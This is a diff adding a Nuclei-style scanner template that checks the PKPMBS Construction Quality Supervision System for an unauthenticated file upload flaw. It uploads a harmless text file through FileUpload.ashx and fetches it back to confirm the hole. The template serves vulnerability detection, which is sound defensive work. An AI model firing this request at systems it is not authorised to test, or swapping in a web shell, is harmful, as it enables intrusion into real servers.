@@ -1,0 +1,65 @@
+id: pkpmbs-fileupload-vulnerability
+info:
+  name: PKPMBS Construction Quality Supervision System FileUpload.ashx Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    This template identifies file upload vulnerabilities in the PKPMBS Construction Quality Supervision System by testing the FileUpload.ashx endpoint.
+
+variables:
+  random_filename: '{{rand_int(1000,10000)}}'
+  random_content: '{{md5(random_filename)}}'
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/Platform/System/FileUpload.ashx"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----YsOxWxSvj1KyZow1PTsh98fdu6l"
+    body: |-
+      ------YsOxWxSvj1KyZow1PTsh98fdu6l
+      Content-Disposition: form-data; name="file"; filename="{{random_filename}}.txt"
+      Content-Type: image/png
+
+      {{random_content}}
+      ------YsOxWxSvj1KyZow1PTsh98fdu6l
+      Content-Disposition: form-data; name="target"
+
+      /Applications/SkillDevelopAndEHS/
+      ------YsOxWxSvj1KyZow1PTsh98fdu6l--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{random_filename}}"
+          - "\"msg\":\"上传成功\""
+    extractors:
+      - type: regex
+        name: uploaded_file_path
+        internal: true
+        group: 0
+        regex:
+          - "/Applications/SkillDevelopAndEHS/{{random_filename}}\\.txt"
+
+  - id: verify-uploaded-file
+    method: GET
+    path:
+      - "{{BaseURL}}/Applications/SkillDevelopAndEHS/{{random_filename}}.txt"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{random_content}}"
